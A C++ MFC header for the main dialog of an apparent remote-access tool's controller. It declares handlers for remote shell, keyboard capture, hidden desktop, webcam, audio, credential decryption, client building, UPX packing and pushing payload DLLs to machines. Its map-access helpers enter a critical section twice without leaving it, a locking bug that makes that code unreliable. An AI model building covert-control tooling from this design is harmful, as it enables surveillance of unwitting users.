
// 2015RemoteDlg.h : 头文件
//

#pragma once
#include "afxcmn.h"
#include "TrueColorToolBar.h"
#include "IOCPServer.h"

//////////////////////////////////////////////////////////////////////////
// 以下为特殊需求使用

// 是否在退出主控端时也退出客户端
#define CLIENT_EXIT_WITH_SERVER 0

typedef struct DllInfo {
	std::string Name;
	Buffer* Data;
	~DllInfo() {
		SAFE_DELETE(Data);
	}
}DllInfo;

#define ID_DYNAMIC_MENU_BASE 36500

//////////////////////////////////////////////////////////////////////////
#include <unordered_map>
#include <fstream>

enum {
	MAP_NOTE,
	MAP_LOCATION,
};

struct _ClientValue
{
	char Note[64];
	char Location[64];
	char Reserved[128]; // 预留
	_ClientValue() {
		memset(this, 0, sizeof(_ClientValue));
	}
	_ClientValue(const CString& loc, const CString& s) {
		memset(this, 0, sizeof(_ClientValue));
		strcpy_s(Note, s.GetString());
		strcpy_s(Location, loc.GetString());
	}
	void UpdateNote(const CString& s) {
		strcpy_s(Note, s.GetString());
	}
	void UpdateLocation(const CString& loc) {
		strcpy_s(Location, loc.GetString());
	}
	const char* GetNote() const {
		return Note;
	}
	const char* GetLocation() const {
		return Location;
	}
	int GetLength() const {
		return sizeof(_ClientValue);
	}
};

typedef uint64_t ClientKey;

typedef _ClientValue ClientValue;

typedef  std::unordered_map<ClientKey, ClientValue> ComputerNoteMap;

// 保存 unordered_map 到文件
void SaveToFile(const ComputerNoteMap& data, const std::string& filename);

// 从文件读取 unordered_map 数据
void LoadFromFile(ComputerNoteMap& data, const std::string& filename);

//////////////////////////////////////////////////////////////////////////

enum
{
	PAYLOAD_DLL_X86 = 0,			// 32位 DLL
	PAYLOAD_DLL_X64 = 1,			// 64位 DLL
	PAYLOAD_MAXTYPE
};

// CMy2015RemoteDlg 对话框
class CMy2015RemoteDlg : public CDialogEx
{
protected:
	ComputerNoteMap m_ClientMap;
	CString GetClientMapData(ClientKey key, int typ) {
		EnterCriticalSection(&m_cs);
		auto f = m_ClientMap.find(key);
		CString r;
		if (f != m_ClientMap.end()) {
			switch (typ)
			{
			case MAP_NOTE:
				r = f->second.GetNote();
				break;
			case MAP_LOCATION:
				r = f->second.GetLocation();
				break;
			default:
				break;
			}
		}
		EnterCriticalSection(&m_cs);
		return r;
	}
	void SetClientMapData(ClientKey key, int typ, const char* value) {
		EnterCriticalSection(&m_cs);
		switch (typ)
		{
		case MAP_NOTE:
			m_ClientMap[key].UpdateNote(value);
			break;
		case MAP_LOCATION:
			m_ClientMap[key].UpdateLocation(value);
			break;
		default:
			break;
		}
		EnterCriticalSection(&m_cs);
	}
	// 构造
public:
	CMy2015RemoteDlg(CWnd* pParent = NULL);	// 标准构造函数
	~CMy2015RemoteDlg();
	// 对话框数据
	enum { IDD = IDD_MY2015REMOTE_DIALOG };
protected:
	virtual void DoDataExchange(CDataExchange* pDX);	// DDX/DDV 支持
	// 实现
protected:
	HICON m_hIcon;
	void* m_tinyDLL;
	std::string m_superPass;

	// 生成的消息映射函数
	virtual BOOL OnInitDialog();
	afx_msg void OnSysCommand(UINT nID, LPARAM lParam);
	afx_msg void OnPaint();
	afx_msg HCURSOR OnQueryDragIcon();
	DECLARE_MESSAGE_MAP()
public:
	void SortByColumn(int nColumn);
	afx_msg VOID OnHdnItemclickList(NMHDR* pNMHDR, LRESULT* pResult);
	static int CALLBACK CompareFunction(LPARAM lParam1, LPARAM lParam2, LPARAM lParamSort);
	template<class T, int id, int Show=SW_SHOW> LRESULT OpenDialog(WPARAM wParam, LPARAM lParam)
	{
		CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)lParam;
		T* Dlg = new T(this, ContextObject->GetServer(), ContextObject);
		Dlg->Create(id, GetDesktopWindow());
		Dlg->ShowWindow(Show);

		ContextObject->hWnd = Dlg->GetSafeHwnd();
		ContextObject->hDlg = Dlg;

		return 0;
	}
	VOID InitControl();             //初始控件
	VOID TestOnline();              //测试函数
	VOID AddList(CString strIP, CString strAddr, CString strPCName, CString strOS, CString strCPU, CString strVideo, CString strPing, 
		CString ver, CString startTime, const std::vector<std::string> &v, CONTEXT_OBJECT* ContextObject);
	VOID ShowMessage(CString strType, CString strMsg);
	VOID CreatStatusBar();
	VOID CreateToolBar();
	VOID CreateNotifyBar();
	VOID CreateSolidMenu();	
	int m_nMaxConnection;
	BOOL Activate(const std::string& nPort,int nMaxConnection, const std::string& method);
	void UpdateActiveWindow(CONTEXT_OBJECT* ctx);
	void SendMasterSettings(CONTEXT_OBJECT* ctx);
	VOID SendServerDll(CONTEXT_OBJECT* ContextObject, bool isDLL, bool is64Bit);
	Buffer* m_ServerDLL[PAYLOAD_MAXTYPE];
	Buffer* m_ServerBin[PAYLOAD_MAXTYPE];
	MasterSettings m_settings;
	static BOOL CALLBACK NotifyProc(CONTEXT_OBJECT* ContextObject);
	static BOOL CALLBACK OfflineProc(CONTEXT_OBJECT* ContextObject);
	VOID MessageHandle(CONTEXT_OBJECT* ContextObject);
	VOID SendSelectedCommand(PBYTE  szBuffer, ULONG ulLength);
	// 显示用户上线信息
	CWnd* m_pFloatingTip=nullptr;
	CListCtrl  m_CList_Online;    
	CListCtrl  m_CList_Message;

	void DeletePopupWindow();

	CStatusBar m_StatusBar;          //状态条
	CTrueColorToolBar m_ToolBar;

	std::vector<DllInfo*> m_DllList;
	NOTIFYICONDATA  m_Nid;
	HANDLE m_hExit;
	CRITICAL_SECTION m_cs;
	BOOL       isClosed;
	CMenu	   m_MainMenu;
	CBitmap m_bmOnline[12];
	bool CheckValid(int trail = 14);
	afx_msg void OnTimer(UINT_PTR nIDEvent);
	afx_msg void OnClose();
			void Release();
	afx_msg void OnSize(UINT nType, int cx, int cy);
	afx_msg void OnNMRClickOnline(NMHDR *pNMHDR, LRESULT *pResult);
	afx_msg void OnOnlineMessage();
	afx_msg void OnOnlineDelete();
	afx_msg void OnOnlineUpdate();
	afx_msg void OnAbout();
	afx_msg void OnIconNotify(WPARAM wParam,LPARAM lParam);
	afx_msg void OnNotifyShow();
	afx_msg void OnNotifyExit();
	afx_msg void OnMainSet();
	afx_msg void OnMainExit();
	afx_msg void OnOnlineCmdManager();
	afx_msg void OnOnlineProcessManager();
	afx_msg void OnOnlineWindowManager();
	afx_msg void OnOnlineDesktopManager();
	afx_msg void OnOnlineAudioManager();
	afx_msg void OnOnlineVideoManager();
	afx_msg void OnOnlineFileManager();
	afx_msg void OnOnlineServerManager();
	afx_msg void OnOnlineRegisterManager();
	afx_msg VOID OnOnlineKeyboardManager();
	afx_msg void OnOnlineBuildClient();
	afx_msg LRESULT OnUserToOnlineList(WPARAM wParam, LPARAM lParam);
	afx_msg LRESULT OnUserOfflineMsg(WPARAM wParam, LPARAM lParam);
	afx_msg LRESULT OnOpenScreenSpyDialog(WPARAM wParam, LPARAM lParam);
	afx_msg LRESULT OnOpenFileManagerDialog(WPARAM wParam,LPARAM lParam);
	afx_msg LRESULT OnOpenTalkDialog(WPARAM wPrarm,LPARAM lParam);
	afx_msg LRESULT OnOpenShellDialog(WPARAM wParam,LPARAM lParam);
	afx_msg LRESULT OnOpenSystemDialog(WPARAM wParam,LPARAM lParam);
	afx_msg LRESULT OnOpenAudioDialog(WPARAM wParam,LPARAM lParam);
	afx_msg LRESULT OnOpenRegisterDialog(WPARAM wParam, LPARAM lParam);
	afx_msg LRESULT OnOpenServicesDialog(WPARAM wParam, LPARAM lParam);
	afx_msg LRESULT OnOpenVideoDialog(WPARAM wParam, LPARAM lParam);
	afx_msg LRESULT OnHandleMessage(WPARAM wParam, LPARAM lParam);
	afx_msg LRESULT OnOpenKeyboardDialog(WPARAM wParam, LPARAM lParam);
	afx_msg LRESULT OnOpenHideScreenDialog(WPARAM wParam, LPARAM lParam);
	afx_msg LRESULT OnOpenMachineManagerDialog(WPARAM wParam, LPARAM lParam);
	afx_msg LRESULT OnOpenProxyDialog(WPARAM wParam, LPARAM lParam);
	afx_msg LRESULT OnOpenChatDialog(WPARAM wParam, LPARAM lParam);
	afx_msg LRESULT OnOpenDecryptDialog(WPARAM wParam, LPARAM lParam);
	afx_msg LRESULT OnOpenFileMgrDialog(WPARAM wParam, LPARAM lParam);
	afx_msg LRESULT OnOpenDrawingBoard(WPARAM wParam, LPARAM lParam);
	afx_msg LRESULT UPXProcResult(WPARAM wParam, LPARAM lParam);
	afx_msg BOOL OnHelpInfo(HELPINFO* pHelpInfo);
	virtual BOOL PreTranslateMessage(MSG* pMsg);
	afx_msg void OnOnlineShare();
	afx_msg void OnToolAuth();
	afx_msg void OnToolGenMaster();
	afx_msg void OnMainProxy();
	afx_msg void OnOnlineHostnote();
	afx_msg void OnHelpImportant();
	afx_msg void OnHelpFeedback();
	afx_msg void OnDynamicSubMenu(UINT nID);
	afx_msg void OnOnlineVirtualDesktop();
	afx_msg void OnOnlineGrayDesktop();
	afx_msg void OnOnlineRemoteDesktop();
	afx_msg void OnOnlineH264Desktop();
	afx_msg void OnWhatIsThis();
	afx_msg void OnOnlineAuthorize();
	void OnListClick(NMHDR* pNMHDR, LRESULT* pResult);
	afx_msg void OnOnlineUnauthorize();
	afx_msg void OnToolRequestAuth();
	afx_msg LRESULT OnPasswordCheck(WPARAM wParam, LPARAM lParam);
	afx_msg void OnToolInputPassword();
};
